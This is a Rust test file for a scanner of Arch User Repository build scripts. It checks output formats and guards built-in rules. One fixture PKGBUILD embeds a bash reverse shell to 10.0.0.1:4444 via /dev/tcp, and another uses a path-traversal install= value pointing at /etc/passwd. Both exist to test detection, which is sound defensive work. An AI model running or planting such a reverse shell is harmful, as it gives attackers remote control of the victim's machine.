//! Output-contract tests: stdout stays machine-readable, logs go to stderr,
//! listing commands derive from the catalog, and a user-writable rules dir can
//! never weaken a built-in.

use std::path::{Path, PathBuf};
use std::process::{Command, Output};

fn bin() -> &'static str {
    env!("CARGO_BIN_EXE_aur-scan")
}

fn scratch(name: &str) -> PathBuf {
    let dir = std::env::temp_dir().join(format!("aur-scan-oc-{}-{name}", std::process::id()));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(&dir).unwrap();
    dir
}

fn run(args: &[&str]) -> Output {
    Command::new(bin())
        .args(args)
        .env_remove("RUST_LOG")
        .output()
        .expect("failed to run aur-scan")
}

fn write_pkgbuild(dir: &Path, body: &str) {
    std::fs::write(dir.join("PKGBUILD"), body).unwrap();
}

/// A package whose `install=` escapes the directory makes the scanner log a
/// warning during the scan.
const WARNING_PKG: &str =
    "pkgname=t\npkgver=1\npkgrel=1\ninstall=../../etc/passwd\nbuild() {\n  true\n}\n";

#[test]
fn warnings_go_to_stderr_and_json_sarif_stay_valid() {
    let dir = scratch("warn");
    write_pkgbuild(&dir, WARNING_PKG);
    for fmt in ["json", "sarif"] {
        let out = run(&["scan", dir.to_str().unwrap(), "--format", fmt]);
        let stdout = String::from_utf8_lossy(&out.stdout);
        let v: serde_json::Value = serde_json::from_slice(&out.stdout)
            .unwrap_or_else(|e| panic!("{fmt} stdout is not one JSON document ({e}): {stdout}"));
        assert!(v.is_object());
        assert!(
            !stdout.contains("WARN"),
            "log line leaked to stdout: {stdout}"
        );
        assert!(!stdout.contains('\u{1b}'), "ANSI escape on stdout");
        let stderr = String::from_utf8_lossy(&out.stderr);
        assert!(
            stderr.contains("suspicious install="),
            "the warning must be on stderr: {stderr}"
        );
        assert!(
            !stderr.contains('\u{1b}'),
            "no ANSI when stderr is not a TTY: {stderr:?}"
        );
    }
}

#[test]
fn sarif_driver_rules_are_unique_and_results_index_them() {
    let dir = scratch("sarif");
    write_pkgbuild(
        &dir,
        "pkgname=t\npkgver=1\npkgrel=1\nsource=(http://a.example/x http://b.example/y)\nsha256sums=(SKIP SKIP)\n",
    );
    let out = run(&[
        "scan",
        dir.to_str().unwrap(),
        "--format",
        "sarif",
        "--include-info",
    ]);
    let v: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap();
    let rules = v["runs"][0]["tool"]["driver"]["rules"].as_array().unwrap();
    let mut ids: Vec<&str> = rules.iter().map(|r| r["id"].as_str().unwrap()).collect();
    let n = ids.len();
    ids.sort();
    ids.dedup();
    assert_eq!(ids.len(), n, "driver.rules must be unique by id");
    for r in v["runs"][0]["results"].as_array().unwrap() {
        let idx = r["ruleIndex"].as_u64().expect("ruleIndex") as usize;
        assert_eq!(rules[idx]["id"], r["ruleId"]);
    }
}

#[test]
fn codes_rejects_bogus_format_and_category() {
    let bad_fmt = run(&["codes", "--format", "bogus"]);
    assert!(!bad_fmt.status.success(), "--format bogus must fail");
    let bad_cat = run(&["codes", "--category", "nonsense-category"]);
    assert!(!bad_cat.status.success(), "--category nonsense must fail");
    assert!(run(&["codes", "--format", "json"]).status.success());
    assert!(run(&["codes", "--category", "persistence"])
        .status
        .success());
}

#[test]
fn explain_prints_a_severity_line() {
    let out = run(&["explain", "DLE-001"]);
    assert!(out.status.success());
    let text = String::from_utf8_lossy(&out.stdout);
    assert!(
        text.lines()
            .any(|l| l.trim_start().starts_with("Severity:")),
        "explain output needs a `Severity:` line: {text}"
    );
}

#[test]
fn rules_listing_matches_the_catalog() {
    let codes = run(&["codes", "--format", "json"]);
    let cat: serde_json::Value = serde_json::from_slice(&codes.stdout).unwrap();
    let entries = cat["entries"].as_array().unwrap();
    let out = run(&["rules"]);
    assert!(out.status.success());
    let text = String::from_utf8_lossy(&out.stdout);
    for e in entries {
        let id = e["id"].as_str().unwrap();
        let sev = e["severity"].as_str().unwrap().to_uppercase();
        let name = e["name"].as_str().unwrap();
        let line = text
            .lines()
            .find(|l| l.starts_with(&format!("{id} [")))
            .unwrap_or_else(|| panic!("rules listing is missing {id}"));
        assert!(
            line.contains(&format!("[{sev}]")) && line.contains(name),
            "rules line for {id} drifted from the catalog: {line}"
        );
    }
}

#[test]
fn user_rules_dir_cannot_lower_a_builtin() {
    let cfg = scratch("xdg");
    let rules_d = cfg.join("aur-scanner/rules.d");
    std::fs::create_dir_all(&rules_d).unwrap();
    std::fs::write(
        rules_d.join("x.toml"),
        r#"
[[rule]]
id = "SHELL-001"
name = "lowered"
description = "d"
severity = "info"
category = "malicious_code"
recommendation = "r"
[[rule.patterns]]
type = "regex"
pattern = "neverMatchesAnything12345"
"#,
    )
    .unwrap();
    let pkg = scratch("revshell");
    write_pkgbuild(
        &pkg,
        "pkgname=t\npkgver=1\npkgrel=1\nbuild() {\n  bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n}\n",
    );
    let out = Command::new(bin())
        .args(["scan", pkg.to_str().unwrap(), "--format", "json"])
        .env("XDG_CONFIG_HOME", &cfg)
        .output()
        .unwrap();
    let v: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap();
    let hit = v["findings"]
        .as_array()
        .unwrap()
        .iter()
        .find(|f| f["id"] == "SHELL-001")
        .expect("SHELL-001 must still fire");
    assert_eq!(hit["severity"], "critical");
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        stderr.contains("SHELL-001") && stderr.contains("warning"),
        "collision must be reported loudly on stderr: {stderr}"
    );
}
